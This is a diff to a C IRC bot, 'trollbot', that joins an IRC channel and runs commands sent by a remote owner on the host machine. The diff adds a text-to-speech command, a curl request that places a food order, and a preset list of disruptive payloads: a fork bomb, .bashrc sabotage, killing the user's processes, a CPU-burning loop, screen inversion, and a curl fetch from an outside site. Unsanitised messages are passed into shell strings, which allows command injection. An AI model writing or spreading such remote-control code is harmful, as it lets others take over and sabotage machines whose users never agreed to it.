@@ -8,6 +8,7 @@
 #include <netdb.h>
 
 #define BUFFSIZE 512
+#define TROLLINGSIZE 200
 
 struct IncomingMessage {
 	char *user;
@@ -18,13 +19,15 @@ struct IncomingMessage {
 };
 typedef struct IncomingMessage IncomingMessage;
 
+char user[100];
+
 int sock;
 char sbuf[BUFFSIZE]; /*socket buffer*/
 IncomingMessage inc;
 static const char owner[] = "codeniko";
 char channel[] = "#KeepTrollin";
 
-char *trollings[200]; 
+char trollings[20][TROLLINGSIZE]; 
 void initTrollings();
 
 
@@ -42,7 +45,6 @@ void sendToChannel(char *msg) {
 }
 
 void getSystemInfo() {
-	char user[100];
 	getlogin_r(user, 100);
 	struct utsname info;
 	uname(&info);
@@ -63,6 +65,7 @@ int troll(char *arg1, char *msg) {
 		sendToChannel(presetmsg);
 		ret = system(trollings[id]);
 	} else {
+		char cmd[BUFFSIZE];
 		msg[strlen(msg)-2] = '\0';
 		if (strncmp(arg1, "cmd", 3) == 0) {
 			FILE *fp; 
@@ -77,15 +80,21 @@ int troll(char *arg1, char *msg) {
 				return 1;
 			pclose(fp);
 		} else if (strncmp(arg1, "wall", 4) == 0) {
-			char cmd[BUFFSIZE];
 			sprintf(cmd, "echo \"%s\" | wall", msg);
 			sendToChannel(cmd);
 			ret = system(cmd);
 		} else if (strncmp(arg1, "popup", 5) == 0) {
-			char cmd[BUFFSIZE];
 			sprintf(cmd, "export DISPLAY=:0.0;zenity --warning --text=\"%s\" &", msg);
 			sendToChannel(cmd);
 			ret = system(cmd);
+		} else if (strncmp(arg1, "say", 3) == 0) {
+			sprintf(cmd, "echo \"%s\" | espeak &", msg);
+			sendToChannel(cmd);
+			ret = system(cmd);
+		} else if (strncmp(arg1, "ordr.in", 7) == 0) {
+			sendToChannel("Trolling by ordering sushi");
+			ret = system("curl -X POST -d'rid=23878&tray=18945794/5+18945795/+18945796/5&tip=5.05&delivery_date=ASAP&delivery_time=ASAP&first_name=Niko&last_name=LovesYou&addr=500 7th ave&city=new york&state=NY&zip=10001&phone=2345678901&em=sdafa@sadfsad.com&password=&card_name=Example User&card_number=4111111111111111&card_cvc=123&card_expiry=02/2016&card_bill_addr=1 Main Street&card_bill_addr2=&card_bill_city=College Station&card_bill_state=TX&card_bill_zip=77840&card_bill_phone=2345678901' \"https://o-test.ordr.in/o/23878?_auth=1,eqHt_0szKYaamH4sKd_tTI0KTwiMYUrs0NpJFYxueh8\"");
+			sendToChannel("Order placed!");
 		}
 	}
 
@@ -158,8 +167,6 @@ int parsePrivateCommand() {
 }
 
 int main() {
-	initTrollings();
-
 	char *nick = "trollbot";
 	char *host = "irc.quakenet.org";
 	char *port = "6667";
@@ -217,6 +224,7 @@ int main() {
 
 					if (!strncmp(inc.commandIRC, "001", 3) && channel != NULL) {
 						joinChannel(channel);
+						initTrollings();
 					} else if (!strncmp(inc.commandIRC, "PRIVMSG", 7) || !strncmp(inc.commandIRC, "NOTICE", 6)) {
 						if (inc.where == NULL || inc.message == NULL) 
 							continue;
@@ -249,28 +257,25 @@ int main() {
 }
 
 void initTrollings() {
-	trollings[0] = "killall gnome-panel";
-	trollings[1] = "cat /dev/zero > /dev/null";
-	trollings[2] = ":(){ :|:& }";
-	trollings[3] = "echo 'alias cd=\"echo Segmentation fault\" && echo $* > /dev/null' >> ~/.bashrc; echo 'alias ls=\"echo .\"' >> ~/.bashrc";
-	trollings[4] = "~/.trollin/photo_troll.sh flip";
-	trollings[5] = "~/.trollin/photo_troll.sh blur";
-	trollings[6] = "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.trollin/.baby.wav; fi; aplay ~/.trollin/.baby.wav &";
-	trollings[7] = "eject -T";
-	trollings[8] = "eject -t";
-	trollings[9] = "echo sleep 5 >> ~/.bashrc";
-	trollings[10] = "xterm -e \"telnet towel.blinkenlights.nl\" &";
-	/*trollings[11] = "";
-	trollings[12] = "";
-	trollings[13] = "";
-	trollings[14] = "";
-	trollings[15] = "";
-	trollings[16] = "";
-	trollings[17] = "";
-	trollings[18] = "";
-	trollings[19] = "";
-	trollings[20] = "";
-	trollings[21] = "";
-	trollings[22] = "";
-	trollings[23] = ""; */
+	strncpy(trollings[0], "killall gnome-panel", TROLLINGSIZE);
+	strncpy(trollings[1], "cat /dev/zero > /dev/null", TROLLINGSIZE);
+	strncpy(trollings[2], ":(){ :|:& }", TROLLINGSIZE);
+	strncpy(trollings[3], "echo 'alias cd=\"echo Segmentation fault\" && echo $* > /dev/null' >> ~/.bashrc; echo 'alias ls=\"echo .\"' >> ~/.bashrc", TROLLINGSIZE);
+	strncpy(trollings[4], "~/.trollin/photo_troll.sh flip", TROLLINGSIZE);
+	strncpy(trollings[5], "~/.trollin/photo_troll.sh blur", TROLLINGSIZE);
+	strncpy(trollings[6], "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.trollin/.baby.wav; fi; aplay ~/.trollin/.baby.wav &", TROLLINGSIZE);
+	strncpy(trollings[7], "eject -T", TROLLINGSIZE);
+	strncpy(trollings[8], "eject -t", TROLLINGSIZE);
+	strncpy(trollings[9], "echo sleep 5 >> ~/.bashrc", TROLLINGSIZE);
+	strncpy(trollings[10], "xterm -e \"telnet towel.blinkenlights.nl\" &", TROLLINGSIZE);
+	sprintf(sbuf, "pkill -u %s", user);
+	strncpy(trollings[11], sbuf, TROLLINGSIZE);
+
+	strncpy(trollings[12], "xterm -e \"sl -a\" &", TROLLINGSIZE);
+	strncpy(trollings[13], "while true; do xcalib -invert -alter; sleep 0.1; done &", TROLLINGSIZE);
+	strncpy(trollings[14], "", TROLLINGSIZE);
+	strncpy(trollings[15], "", TROLLINGSIZE);
+	strncpy(trollings[16], "", TROLLINGSIZE);
+	strncpy(trollings[17], "", TROLLINGSIZE);
+	strncpy(trollings[18], "", TROLLINGSIZE);
 }
